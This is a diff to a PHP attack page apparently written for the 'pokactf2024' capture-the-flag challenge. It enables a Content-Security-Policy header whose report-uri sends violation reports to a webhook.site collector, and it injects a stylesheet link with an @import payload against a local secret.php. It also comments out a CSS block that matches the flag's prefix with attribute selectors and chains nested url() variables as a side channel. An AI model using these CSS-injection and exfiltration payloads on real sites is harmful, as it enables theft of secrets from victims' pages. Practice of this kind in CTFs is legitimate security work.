@@ -1,9 +1,9 @@
 <?php
-// header("Content-Security-Policy: style-src http://127.0.0.1/secret.php; report-uri https://webhook.site/1e0ceffd-be43-4cfc-be6a-be066a25f9d2;");
-// echo '<link rel="stylesheet" href="http://127.0.0.1/secret.php?whatUwant=@import \'">';
+header("Content-Security-Policy: style-src http://127.0.0.1/secret.php; report-uri https://webhook.site/4c7d9978-18f2-4ce6-ab5f-d6c1f2e8fbcd;");
+echo '<link rel="stylesheet" href="http://127.0.0.1/secret.php?whatUwant=@import \'">';
 echo "<a>hi</a>";
 ?>
-<style>
+<!-- <style>
 h1[flag^="pokactf2024{"] {
     --a: url(/?1),url(/?1),url(/?1),url(/?1),url(/?1);
     --b: var(--a),var(--a),var(--a),var(--a),var(--a);
@@ -16,6 +16,6 @@ h1[flag^="pokactf2024{"] {
 * {
     background-image: var(--g);
 };
-</style>
+</style> -->
 
 
